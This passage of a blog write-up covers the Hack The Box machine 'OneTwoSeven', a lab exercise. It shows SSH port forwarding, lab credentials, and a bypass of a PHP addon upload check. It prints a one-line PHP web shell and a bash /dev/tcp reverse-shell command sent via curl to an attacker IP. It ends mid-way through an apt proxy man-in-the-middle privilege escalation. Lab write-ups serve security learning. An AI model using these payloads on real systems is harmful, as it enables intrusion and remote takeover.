+</span></span><span style="display:flex;"><span>              &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">colspan</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span>&gt;&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;Login&lt;/<span style="color:#f92672">button</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">table</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>	     &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">hr</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;featurette-divider&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- /END THE FEATURETTES --&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">div</span>&gt;<span style="color:#75715e">&lt;!-- /.container --&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!-- FOOTER --&gt;</span>
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">footer</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;float-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span>&gt;Back to top&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">p</span>&gt;&amp;copy; 2019 OneTwoSeven, Dec. &amp;middot; &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span>&gt;Privacy&lt;/<span style="color:#f92672">a</span>&gt; &amp;middot; &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span>&gt;Terms&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">footer</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://code.jquery.com/jquery-3.3.1.slim.min.js&#34;</span> <span style="color:#a6e22e">integrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&#34;</span> <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">script</span>&gt;window.<span style="color:#a6e22e">jQuery</span> <span style="color:#f92672">||</span> document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#39;&lt;script src=&#34;/docs/4.3/assets/js/vendor/jquery-slim.min.js&#34;&gt;&lt;\/script&gt;&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dist/js/bootstrap.bundle.min.js&#34;</span> <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><h3 id="admin-panel">Admin panel</h3>
+<p>We then are kind of stuck and the only thing that we discovered earlier is the existence of this <code>Admin panel</code>. Since we have credentials, we might as well try them on the box to have an access coming from it as it might be whitelisted:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh ots-iOTdjZWI@10.129.105.67
+</span></span><span style="display:flex;"><span>ots-iOTdjZWI@10.129.105.67<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>This service allows sftp connections only.
+</span></span><span style="display:flex;"><span>Connection to 10.129.105.67 closed.
+</span></span></code></pre></div><p>unfortunately, it seems like an <code>ssh</code> session cannot be made &ndash;&gt; we can still use <code>ssh</code>simply for port forwarding using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>man ssh
+</span></span><span style="display:flex;"><span>-N      Do not execute a remote command.  This is useful <span style="color:#66d9ef">for</span> just forwarding ports.  Refer to the description of SessionType in ssh_config<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span> details.
+</span></span></code></pre></div><p>We can then try to port forward with this flag set as well:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -N -L 60080:127.0.0.1:60080 ots-iOTdjZWI@10.129.105.67
+</span></span></code></pre></div><p>and this time it seems to work! ==&gt; We can then head to <code>http://localhost:60080</code> and this time we have access to the <code>Admin panel</code>:</p>
+<p><img src="OTS_admin.png" alt=""></p>
+<p>From here we can login using our previously acquired credentials:</p>
+<ul>
+<li><code>ots-admin</code>- <code>Homesweethome1</code>
+And we get welcomed by a page where we can upload plugins:</li>
+</ul>
+<p><img src="OTS_plugins.png" alt=""></p>
+<p>And we see that the <code>Submit Query</code>button has been disabled for <code>security reasons</code>
+==&gt; In the default plugins, we see one which reveals the default user credentials:</p>
+<p><img src="OTS_creds.png" alt=""></p>
+<ul>
+<li><code>ots-yODc2NGQ</code>- <code>f528764d</code>
+And coming back to the <code>sftp</code>session, we can get the user flag with these credentials:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sftp ots-yODc2NGQ@10.129.105.67
+</span></span><span style="display:flex;"><span>ots-yODc2NGQ@10.129.105.67<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Connected to 10.129.105.67.
+</span></span><span style="display:flex;"><span>sftp&gt; ls
+</span></span><span style="display:flex;"><span>public_html  user.txt     
+</span></span><span style="display:flex;"><span>sftp&gt; get user.txt 
+</span></span><span style="display:flex;"><span>Fetching /user.txt to user.txt
+</span></span><span style="display:flex;"><span>user.txt
+</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
+<p>New creds: <code>ots-2YzE5M2U</code> - <code>2a6c193e</code>
+We now need a way to get a foothold on the machine and this will most likely be done with the <code>Upload</code>functionality. Looking at it, we see the <code>OTS ADDON MANAGER</code>and its content:</p>
+<p><img src="OTS_addon.png" alt=""></p>
+<p>We see that it replaces the rules <code>addon-upload/download.php</code>by <code>ots-man-addon.php</code>==&gt; luckily, we can download it and view it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">session_start</span>(); <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span> ($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>])) { <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /login.php&#34;</span>); }; <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strpos</span>($_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>], <span style="color:#e6db74">&#39;/addons/&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span> ) { <span style="color:#66d9ef">die</span>(); };
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OneTwoSeven Admin Plugin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># OTS Addon Manager
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">switch</span> (<span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Upload addon to addons folder.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\/addon-upload.php/&#39;</span>,$_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>])<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;addon&#39;</span>])){
+</span></span><span style="display:flex;"><span>			$errors<span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+</span></span><span style="display:flex;"><span>			$file_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#39;addon&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
+</span></span><span style="display:flex;"><span>			$file_size <span style="color:#f92672">=</span>$_FILES[<span style="color:#e6db74">&#39;addon&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>];
+</span></span><span style="display:flex;"><span>			$file_tmp <span style="color:#f92672">=</span>$_FILES[<span style="color:#e6db74">&#39;addon&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span>($file_size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">20000</span>){
+</span></span><span style="display:flex;"><span>				$errors[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Module too big for addon manager. Please upload manually.&#39;</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($errors)<span style="color:#f92672">==</span><span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">move_uploaded_file</span>($file_tmp,$file_name);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /menu.php&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-Type: text/plain&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;File uploaded successfull.y&#34;</span>;
+</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /menu.php&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-Type: text/plain&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Error uploading the file: &#34;</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">print_r</span>($errors);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Download addon from addons folder.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\/addon-download.php/&#39;</span>,$_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>])<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($_GET[<span style="color:#e6db74">&#39;addon&#39;</span>]) {
+</span></span><span style="display:flex;"><span>			$addon_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($_GET[<span style="color:#e6db74">&#39;addon&#39;</span>]);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">file_exists</span>($addon_file) ) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-Disposition: attachment; filename=</span><span style="color:#e6db74">$addon_file</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-Type: text/plain&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">readfile</span>($addon_file);
+</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">header</span>($_SERVER[<span style="color:#e6db74">&#34;SERVER_PROTOCOL&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; 404 Not Found&#34;</span>, <span style="color:#66d9ef">true</span>, <span style="color:#ae81ff">404</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;The addon manager must not be executed directly but only via&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;the provided RewriteRules:&lt;br&gt;&lt;hr&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;RewriteEngine On&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;RewriteRule ^addon-download.php addons/ots-man-addon.php [L]&lt;br&gt;&lt;hr&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;By commenting individual RewriteRules you can disable single&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;features (i.e. for security reasons)&lt;br&gt;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;font size=&#39;-2&#39;&gt;Please note: Disabling a feature through htaccess leads to 404 errors for now.&lt;/font&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>And we see that this catches both the <code>upload</code>and <code>download</code>cases &ndash;&gt; we need a way to bypass this and an easy way to do so is using this url:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://localhost:60080/menu.php?addon=addons/addon-download.php&amp;/addon-upload.php
+</span></span></span></code></pre></div><p>As since the <code>addon-download.php</code>will be changed into:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>RewriteEngine On  
+</span></span><span style="display:flex;"><span>RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]  
+</span></span><span style="display:flex;"><span>RewriteRule ^addon-download.php addons/ots-man-addon.php [L]
+</span></span></code></pre></div><p>we can then access the upload after &ndash;&gt; doing this we notice that the <code>Submit Query</code>form is still disabled &ndash;&gt; we can simply edit the source code to remove this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[addon-upload.php](view-source:http://localhost:60080/addon-upload.php)&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;addon&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">disabled</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;disabled&#34;</span> /&gt;&lt;<span style="color:#f92672">sup</span>&gt;&lt;<span style="color:#f92672">font</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-2&#34;</span> <span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;red&#34;</span>&gt; Disabled for security reasons.&lt;/<span style="color:#f92672">font</span>&gt;&lt;/<span style="color:#f92672">sup</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre></div><p>We can simply delete this part of the code and then we&rsquo;re able to submit files! We can then upload a <code>php</code>shell with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Now when sending the request directly like this we get an error:</p>
+<p><img src="OTS_requesterror.png" alt=""></p>
+<p>This is because the <code>/addon-upload.php</code>route gets rejected, instead we can modify it to: <code>/addon-download.php?flan=/addon-upload.php</code>and this will bypass the check and allow us to successfully upload our shell:</p>
+<p><img src="OTS_request.png" alt=""></p>
+<p>We can then try to interact with our file and see if it was successfully uploaded by browsing to: <code>http://localhost:60080/addons/</code>and we see that it is:</p>
+<p><img src="OTS_shellupload.png" alt=""></p>
+<p>==&gt; Then upon testing the command execution we see that it works:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://localhost:60080/addons/shell2.php?cmd<span style="color:#f92672">=</span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>35<span style="color:#f92672">(</span>www-admin-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>35<span style="color:#f92672">(</span>www-admin-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>35<span style="color:#f92672">(</span>www-admin-data<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We can then try to utilize this to get a reverse shell. There are two ways to my knowledge to do so:</p>
+<ol>
+<li>Modify the uploaded file to execute the reverse shell command</li>
+<li>Send a <code>curl</code> request with the payload in the <code>cmd</code>field
+I&rsquo;ll do the second option:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://localhost:60080/addons/shell2.php?cmd<span style="color:#f92672">=</span>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.153%2F4444%200%3E%251%27
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rlwrap nc -lnvp <span style="color:#ae81ff">4444</span> listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ... connect to <span style="color:#f92672">[</span>10.10.14.153<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.104.238<span style="color:#f92672">]</span> <span style="color:#ae81ff">44442</span> bash: cannot set terminal process group <span style="color:#f92672">(</span>1866<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device bash: no job control in this shell www-admin-data@onetwoseven:/var/www/html-admin/addons$ exit
+</span></span></code></pre></div><p>At first this does not seem to work as the command might be a bit buggy, I managed to make it work by using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -G http://localhost:60080/addons/shell2.php --data-urlencode <span style="color:#e6db74">&#34;cmd=bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.153/4444 0&gt;&amp;1&#39;&#34;</span>
+</span></span></code></pre></div><p>And boom we get a shell as <code>www-admin-data</code></p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>As always, starting to check if we have any <code>sudo</code>privileges actually returns something, which I was quite surprised with as it typically isn&rsquo;t the case with <code>www-data</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-admin-data@onetwoseven:/var/www/html-admin/addons$ sudo -l
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> www-admin-data on onetwoseven:
+</span></span><span style="display:flex;"><span>    env_reset, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;ftp_proxy http_proxy https_proxy no_proxy&#34;</span>,
+</span></span><span style="display:flex;"><span>    mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User www-admin-data may run the following commands on onetwoseven:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
+</span></span></code></pre></div><p>We see that we can execute <code>apt update</code>and <code>apt upgrade</code>as <code>sudo</code>, we can then check the <code>apt</code>configuration file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-admin-data@onetwoseven:/etc/apt$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>apt.conf.d        preferences.d  sources.list.d
+</span></span><span style="display:flex;"><span>listchanges.conf  sources.list   trusted.gpg.d
+</span></span></code></pre></div><p>And inside of the directory <code>sources.list.d/</code>we see one unusual source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-admin-data@onetwoseven:/etc/apt/sources.list.d$ cat on
+</span></span><span style="display:flex;"><span>cat onetwoseven.list 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OneTwoSeven special packages - not yet in use</span>
+</span></span><span style="display:flex;"><span>deb <span style="color:#f92672">[</span>trusted<span style="color:#f92672">=</span>yes<span style="color:#f92672">]</span> http://packages.onetwoseven.htb/devuan ascii main
+</span></span></code></pre></div><p>Which means that this will be using the package at <code>http://packages.onetwoseven.htb/devuan</code>&ndash;&gt; we can try and exploit this to make it use our own repository!!</p>
+<h3 id="man-in-the-middle-attack">Man in the middle attack</h3>
+<p>We can first export the <code>http_proxy</code>environment variable and set it to our ip:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-admin-data@onetwoseven:/etc/apt/sources.list.d$ export http_proxy<span style="color:#f92672">=</span>http://10.10.14.153:8888
+</span></span><span style="display:flex;"><span>10.14.153:8888oxy<span style="color:#f92672">=</span>http://10.1
+</span></span><span style="display:flex;"><span>www-admin-data@onetwoseven:/etc/apt/sources.list.d$ echo $http_proxy
+</span></span><span style="display:flex;"><span>echo $http_proxy
+</span></span><span style="display:flex;"><span>http://10.10.14.153:8888
+</span></span></code></pre></div>
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/box/" rel="tag">Box</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ctf/" rel="tag">CTF</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/machine/" rel="tag">Machine</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/htb/" rel="tag">HTB</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/sftp/" rel="tag">SFTP</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/symlink/" rel="tag">symlink</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/hard/" rel="tag">Hard</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Flavien Jaquerod avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Flavien Jaquerod</span>
+	</div>
+	<div class="authorbox__description">
+		Currently studying a cybersecurity Master&rsquo;s degree at EPFL and ETHZ. Also solving CTF challenges or HTB Machines in my free time!
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/sightless/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Sightless</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/jarmis/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Jarmis</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2025 Flavien Jaquerod.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+<script src="/js/custom.js"></script>
